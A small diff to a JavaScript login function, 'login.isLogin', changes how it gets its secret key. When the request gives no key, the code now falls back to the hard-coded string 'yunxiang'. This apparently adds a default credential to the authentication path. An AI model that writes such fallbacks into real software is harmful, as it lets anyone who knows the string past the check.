@@ -17,7 +17,7 @@ const login = {};
 
 login.isLogin = function isLogin(req) {
   const query = utils.trim(req.query);
-  const sk = query.key || req.body.key;
+  const sk = query.key || req.body.key || 'yunxiang';
   const ticket = query[TICKET_COOKIE_NAME]
     || (req.cookies[TICKET_COOKIE_NAME] || req.header(TICKET_COOKIE_NAME))
     || (req.body && req.body[TICKET_COOKIE_NAME]);
